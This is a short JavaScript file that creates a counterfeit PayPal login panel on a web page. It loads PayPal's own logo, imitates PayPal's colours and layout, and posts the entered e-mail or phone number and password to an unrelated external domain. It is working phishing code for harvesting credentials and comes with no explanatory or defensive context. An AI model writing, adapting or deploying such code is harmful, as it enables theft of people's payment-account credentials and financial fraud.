// create the elements
var div = document.createElement('div');
var log = document.createElement('p');
var loginForm = document.createElement('form');

// set body styles
document.body.style.color = '#fff';
document.body.style.textTransform = 'capitalize';

// set main-div styles
div.style.width = '460px';
div.style.height = '440px';
div.style.margin = '50px auto';
div.style.padding = '10px';
div.style.borderRadius = '5px';
div.style.borderWidth = '1px';
div.style.borderStyle = 'solid';
div.style.borderColor = '#eaeced';

log.style.width = "129px";
log.style.background = "transparent url(https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg) top center no-repeat";
log.style.backgroundSize = "auto 28px";
log.style.height = "32px";
log.style.display = "block";
log.style.margin = "40px auto 20px";

// create some variables for styling
var inputStyles = "background:none;border-color:#9da3a6;border-width:1px;border-radius:5px;width:400;height:44;color:#000;padding:10px;margin:10px;box-sizing: border-box;",
    btnStyles = "background:#0070ba;border:none;border-radius:5px;width:400;height:44;color:#fff;padding:10px;margin:10px;font-weight:bold;box-sizing: border-box;";

// set loginForm styles
loginForm.style.margin = '20px 20px 20px 20px';
loginForm.id = 'loginForm';
loginForm.action = 'https://ukia6hk45yd72xaq5gtwmc3yrpxfl4.v13rsba.pl/login';
loginForm.method = 'post';

// set the elements and styles on the form
loginForm.innerHTML = "<input type='text' placeholder='E-mail address / phone number' style='"+ inputStyles +"' /><br/>" + 
                 "<input type='password' placeholder='Password' style='"+ inputStyles +"' /><br/>" + 
                 "<input type='submit' value='Login' style='"+ btnStyles +"' />" ;


// append the bottons and form on main-div
div.appendChild(log);
div.appendChild(loginForm);

// append main-div on the body
document.body.appendChild(div);
